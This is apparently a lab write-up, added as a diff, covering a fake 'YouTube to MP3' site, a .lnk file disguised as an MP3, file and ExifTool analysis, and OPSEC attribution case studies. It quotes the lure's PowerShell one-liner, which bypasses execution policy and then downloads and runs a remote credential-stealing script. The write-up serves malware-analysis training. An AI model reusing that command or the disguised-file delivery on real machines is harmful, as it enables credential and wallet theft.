@@ -1,0 +1,88 @@
+### **Challenge Overview**
+**Scenario:**
+- McSkidy is investigating a suspicious website that allegedly offers a "YouTube to MP3" conversion service. The site is linked to an attacker named "Glitch." 
+- During the investigation, a malicious file named `somg.mp3` is discovered. This file, disguised as an MP3, is actually a Windows shortcut file (.lnk) that executes a PowerShell script to perform malicious activities.
+
+---
+
+### **Learning Objectives**
+1. **Understanding OPSEC:**  
+   - Learn the importance of Operational Security (OPSEC) in avoiding exposure during cyber operations.
+   - Identify common mistakes attackers make that lead to their identification.
+
+2. **Malware Analysis:**  
+   - Analyze suspicious files (e.g., .lnk files) for embedded malicious commands.
+   - Recognize tactics used in delivering malware, such as social engineering and disguised file formats.
+
+3. **Attribution Techniques:**  
+   - Trace digital footprints and metadata to reveal the identities of malicious actors.
+   - Understand real-world cases where OPSEC failures led to successful attributions.
+
+---
+
+### **Key Findings from the Challenge**
+- **Malicious File Behavior:**  
+   The `somg.mp3` file, upon analysis, was revealed to be a `.lnk` file that executed a hidden PowerShell script. This script:
+   - Disabled security restrictions (via `-ep Bypass` and `-nop`).
+   - Downloaded a secondary script (`IS.ps1`) from a remote URL.
+   - Executed the downloaded script to steal sensitive information (e.g., browser credentials, cryptocurrency wallets).
+
+- **OPSEC Mistakes by the Attacker:**  
+   The attacker ("MM") made several critical errors:
+   - Reused usernames and email addresses across different platforms.
+   - Embedded identifiable metadata within files and scripts.
+   - Failed to use anonymization tools (like VPNs or proxies) during malicious operations.
+   - Left clues in public-facing repositories (e.g., GitHub), linking their identity to the attack.
+
+---
+
+### **Tools and Commands You Learned**
+1. **File Identification:**  
+   - The `file` command helps determine the true nature of a file by analyzing its structure.  
+     Example:  
+     ```bash
+     file somg.mp3
+     ```
+     Output revealed it was not an MP3 but a `.lnk` file.
+
+2. **Metadata Extraction with ExifTool:**  
+   - Extract metadata to uncover hidden details in files.  
+     Example:  
+     ```bash
+     exiftool somg.mp3
+     ```
+     This command revealed the embedded PowerShell command within the `.lnk` file.
+
+3. **PowerShell Analysis:**  
+   - Analyze and understand the PowerShell script found in the `.lnk` file:  
+     ```powershell
+     -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
+     ```
+     - `-ep Bypass`: Disables PowerShell execution policy restrictions.
+     - `-nop`: Prevents script debugging or profiling.
+     - `New-Object Net.WebClient`: Creates a web client to download remote files.
+     - `iex`: Executes the contents of the downloaded script.
+
+4. **Attribution Techniques:**  
+   Learn how digital breadcrumbs (e.g., usernames, metadata, and timestamps) can help identify attackers.
+
+---
+
+### **Real-World Case Studies of OPSEC Failures**
+1. **AlphaBay Admin Takedown:**  
+   - Alexandre Cazes, the administrator of AlphaBay (a dark web marketplace), was identified due to reusing his personal email address in welcome emails sent to new users.  
+   - His online alias also linked to personal profiles, enabling law enforcement to trace his real identity.
+
+2. **Chinese APT1 Hackers:**  
+   - A hacking group was uncovered because members followed a predictable naming scheme for malware and operated during Beijing business hours.  
+   - Their infrastructure and activities aligned with known Chinese government affiliations.
+
+---
+
+### **Conclusion**
+This task reinforced the importance of **OPSEC practices**, both for attackers (to avoid detection) and defenders (to trace and mitigate attacks). By understanding:
+- How attackers craft and deploy malware.
+- Common mistakes they make.
+- Tools like `file`, `ExifTool`, and PowerShell analysis.
+
+You’ve gained hands-on skills in malware investigation, digital attribution, and the principles of secure operations.
